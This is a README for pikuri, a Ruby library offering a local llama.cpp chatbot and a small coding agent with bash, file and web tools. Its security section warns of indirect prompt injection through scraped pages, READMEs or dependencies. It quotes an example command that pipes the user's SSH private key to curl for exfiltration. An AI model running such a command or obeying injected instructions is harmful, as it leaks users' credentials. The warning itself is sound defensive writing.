# pikuri

A small Ruby AI assistant you run on your own machine. `bin/pikuri-chat`
is a general-purpose chatbot with a calculator, web search, web
scraping, and a fetch tool — wired by default to a
[llama.cpp](https://github.com/ggml-org/llama.cpp) server running
locally, so the conversation never leaves your computer unless the
model itself decides to call a tool.

## Quick start

```sh
git clone https://codeberg.org/mvysny/pikuri.git
cd pikuri

# Ruby 3.x + bundler (Ubuntu/Debian)
sudo apt install ruby ruby-bundler

bundle install

./bin/pikuri-chat "What is 17 * 23?"
```

The first run won't get far — pikuri-chat needs a model behind it. See
[GETTING_STARTED.md](GETTING_STARTED.md) for the full walkthrough:
installing `llama.cpp`, pulling a model, starting `llama-server`, and
asking your first question.

## Using pikuri as a library

Pikuri is shipped as a Ruby gem you can use in your own project. The
recommended path: **first** play with `bin/pikuri-chat`, inspect the
sources, get a feel for the shape — *then* pull pikuri into your
project as a library:

```ruby
# In your Gemfile
gem 'pikuri'
```

A minimal wiring — single agent, default `llama.cpp` transport, the
bundled calculator + web-search tools, the same system prompt
`pikuri-chat` uses:

```ruby
require 'pikuri'

RubyLLM.configure do |c|
  c.openai_api_base = 'http://localhost:8080/v1'  # llama.cpp default
  c.openai_api_key  = 'not-needed'
end

agent = Pikuri::Agent.new(
  transport: Pikuri::Agent::ChatTransport.new(
    model: 'unsloth/Qwen3.6-35B-A3B-GGUF',
    provider: :openai,
    assume_model_exists: true
  ),
  system_prompt: Pikuri.prompt(:'pikuri-chat'),
  tools: [Pikuri::Tool::CALCULATOR, Pikuri::Tool::WEB_SEARCH],
  listeners: Pikuri::Agent::ListenerList.new([
    Pikuri::Agent::Listener::Terminal.new,
    Pikuri::Agent::Listener::StepLimit.new(max: 20)
  ])
)

agent.run_loop(user_message: 'What is 17 * 23?')
```

`bin/pikuri-chat` and `bin/pikuri-code` in this repo are the canonical
working examples — they're dev/demo scripts (not installed by
`gem install pikuri`), but they're the easiest place to crib wiring
from. The bundled system prompts under `prompts/` are loadable as a
starting point via `Pikuri.prompt(name)`.

## Why this exists

The existing self-hosted agent stacks have grown big and now have a
steep learning curve — a privacy-conscious user arriving fresh hits a
wall of JSON configuration before the first conversation. Pikuri is
the deliberate counter-move:

- **Privacy-first.** Defaults wire a local `llama.cpp` server. No
  cloud account, no API key, no telemetry, no request leaving the
  machine — unless you explicitly opt in by configuring an external
  provider, or the model calls a network tool like `web_search`.
- **Simple.** Two short scripts, sane defaults, no config file required
  to get the first conversation going.
- **Gentle learning curve.** Defaults work without a config file. The
  surface area grows as you grow into it: start by chatting, then add
  a search API key when you want better results, then edit the system
  prompt when you want to specialise behaviour.
- **Teaches you how to use it.** [GETTING_STARTED.md](GETTING_STARTED.md)
  walks you from zero — a fresh checkout, no model running — to a
  working personal assistant: installing the local model server,
  asking your first question, understanding what each bundled tool
  does, and choosing a search backend that matches your privacy
  comfort level.

## Curious how the agentic loop actually works?

Pikuri sits on top of [ruby_llm](https://rubyllm.com), which owns the
Thought → Tool-call → Observation loop. If you want to *learn* how
that loop works internally — minimal code, no extension surface,
nothing to wade through — read
[agentic-loop-demo](https://codeberg.org/mvysny/agentic-loop-demo).
It's the same author's small didactic project, written precisely so
the source is the lesson. Pikuri is the production-shaped sibling:
same loop, plus tools, listeners, sub-agents, and ergonomics.

# More Substance

pikuri-chat builds your understanding of pikuri underpinnings, but it's just a toy.
The real fun begins now.

## pikuri-code

An in-repo coding agent in the spirit of Claude Code, opencode, or
pi-code — but kept deliberately small so you can read the sources in
an evening. Wire-by-wire it's the same `Pikuri::Agent` as
`pikuri-chat`, with a different system prompt and a different toolset:
`read`, `write`, `edit`, `grep`, `glob`, `bash`, plus the web tools
and the calculator. Sub-agents are enabled, and any
[Agent Skills](https://agentskills.io/specification) discovered under
`.pikuri/skills`, `.claude/skills`, `.agents/skills` (project or home)
get exposed to the model on demand.

Run it from the root of the repo you want it to work in:

```sh
cd ~/code/your-project
/path/to/pikuri/bin/pikuri-code
```

You'll land in a REPL — type a request at the `>` prompt, hit enter,
and the agent will start reading files, running commands, and editing
code to satisfy it. Ctrl+D (or Ctrl+C) exits. You can also pass an
initial message on the command line:

```sh
/path/to/pikuri/bin/pikuri-code "find the failing spec and fix it"
```

The first time the agent wants to write a file or run a shell command,
it prompts you on the terminal (`(y/n)?`). Read what it's about to do
before you say yes. If an `AGENTS.md` or `CLAUDE.md` exists at the
workspace root, it's prepended to the system prompt as project
context.

### Security: this is a tech demo, treat it accordingly

**Do not run `pikuri-code` against a sensitive checkout on a machine
that holds secrets you care about.** It is a working demo of the
coding-agent shape, *not* a hardened tool. The threat model has
glaring holes:

- **No sandbox.** The `bash` tool runs commands as your user, with
  your environment, your `$HOME`, your `~/.ssh`, your shell history,
  your browser cookies, your cloud CLI credentials — all reachable.
  An LLM that's been prompt-injected (e.g. by a malicious README it
  scraped, a poisoned dependency, or a crafted file in the repo) can
  ask to run `cat ~/.ssh/id_ed25519 | curl -X POST ...` and the only
  thing standing between that and exfiltration is *you* reading the
  confirmation prompt carefully. The workspace lock applies to
  pikuri's own `read`/`write`/`edit`/`grep`/`glob` tools — it does
  **not** apply to `bash`, which can `cat`, `cp`, `scp`, `curl`
  anything the OS lets your user touch.
- **`--yolo` auto-approves everything.** That flag exists for use
  *inside* a disposable container or VM. Running `--yolo` on your
  laptop is equivalent to handing the model a root shell. Don't.
- **Network tools fetch arbitrary URLs.** `web_search`, `web_scrape`,
  and `fetch` are happy to pull whatever the model asks for, and the
  content of those pages then becomes part of the conversation —
  classic indirect prompt-injection surface.
- **No audit log of approved actions.** Once you approve a `bash`
  command it runs; there's no separate record beyond your scrollback.

In short: run it inside a Docker container, a dev container, a VM, a
fresh user account — anywhere you'd be fine with a stranger having a
shell. The sandboxing story is a known gap and tracked as future
work (see `IDEAS.md`); until it lands, **assume the agent can do
anything your user can do**, and approve prompts on that basis.

## pikuri-assistant

Has access to your private documents, can read and respond to e-mails, remembers
stuff. TODO implemented in the future.

## Tests

```sh
bundle exec rspec
```
